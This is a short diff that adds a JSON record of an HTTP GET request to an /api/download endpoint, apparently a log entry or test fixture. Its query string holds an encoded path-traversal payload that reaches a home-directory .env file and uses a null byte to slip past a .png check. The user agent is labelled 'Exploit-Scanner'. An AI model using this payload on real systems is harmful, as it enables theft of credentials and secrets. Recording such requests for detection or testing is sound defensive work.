@@ -1,0 +1,7 @@
+{
+  "RequestPath": "/api/download",
+  "QueryString": "file=%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2Fhome%2Fclawdbot%2F.env%00.png",
+  "HttpMethod": "GET",
+  "DestinationPort": 3000,
+  "UserAgent": "Mozilla/5.0 (Exploit-Scanner)"
+}
